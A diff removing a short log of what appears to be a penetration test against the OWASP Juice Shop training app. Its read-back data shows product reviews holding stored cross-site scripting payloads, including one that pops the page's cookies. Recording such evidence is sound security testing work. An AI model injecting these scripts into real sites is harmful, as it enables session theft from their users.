@@ -1,4 +1,0 @@
-=== WRITE PAYLOAD REQUEST ===
-{"status":"success"}
-=== READ BACK REQUEST ===
-{"status":"success","data":[{"message":"One of my favorites!","author":"admin@juice-sh.op","product":1,"likesCount":0,"likedBy":[],"_id":"wFrvqNjDcWD3xsgFP","liked":true},{"product":"1","message":"<script>alert(1)</script>","author":"test","likesCount":0,"likedBy":[],"_id":"tGTDuEfWmCxF2diAp","liked":true},{"product":"1","message":"<script>alert(document.cookie)</script>","author":"pentest-evidence","likesCount":0,"likedBy":[],"_id":"Jh62yJfYv4WmbxSeY","liked":true}]}
